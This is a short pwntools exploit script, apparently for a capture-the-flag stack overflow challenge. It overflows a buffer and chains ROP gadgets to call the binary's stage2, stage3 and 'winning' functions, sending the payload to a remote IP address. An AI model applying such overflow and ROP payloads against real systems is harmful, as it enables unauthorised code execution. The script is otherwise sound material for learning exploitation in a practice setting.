#!/usr/bin/env python3

from pwn import *
from pwnlib.gdb import *

STACK_OFFSET = -0xc

context(arch='amd64', os='linux')

e = ELF('./stack_overflow')

r = remote('111.186.57.85', 30013)
# r = process('./stack_overflow')
# gdb.attach(r)
# Stack Overflooooow
print(r.recvline().decode(), end='')

# Stage1
print(r.recvline().decode(), end='')


payload = []

for i in range(11):
    payload += [0xaa, 0xbc, 0xcc, 0xdd]

# !
payload += [0x21, 0x43, 0x65, 0x87]
# stage_1_key += util.packing.pack(ret_addr,
#  word_size = 64, endianness = 'little')
# print(bytes(stage_1_key))


# payload += [0xbe, 0xba, 0xfe, 0xca]
# payload += [0xef, 0xbe, 0xad, 0xde]


payload += [0xaa, 0xbc, 0xcc, 0xdd]
payload += [0x78, 0x56, 0x34, 0x12]

stage_2_addr = e.symbols['stage2']
print("stage 2 addr:", stage_2_addr)

payload += util.packing.pack(stage_2_addr,
                             word_size=64, endianness='little')


# 0x00000000004008d3 : pop rdi ; ret
set_rdi = util.packing.pack(0x4008d3, word_size=64, endianness='little')
payload += set_rdi

payload += util.packing.pack(0xcafebabe, word_size=64, endianness='little')


# 0x00000000004008d3 : pop rsi ; pop r15 ; ret
set_rsi = util.packing.pack(0x4008d1, word_size=64, endianness='little')
payload += set_rsi

payload += util.packing.pack(0xdeadbeef, word_size=64, endianness='little')
payload += util.packing.pack(0xdeadbeef, word_size=64, endianness='little')


stage_3_addr = e.symbols['stage3']
print("stage 3 addr:", stage_3_addr)

payload += util.packing.pack(stage_3_addr,
                             word_size=64, endianness='little')

winning_addr = e.symbols['winning']
print("winning addr:", winning_addr)


payload += util.packing.pack(winning_addr,
                             word_size=64, endianness='little')


with open('./payload.ply', 'wb') as f:
    f.write(bytes(payload))

print("payload len: ", len(payload))
r.send(bytes(payload))


r.interactive()
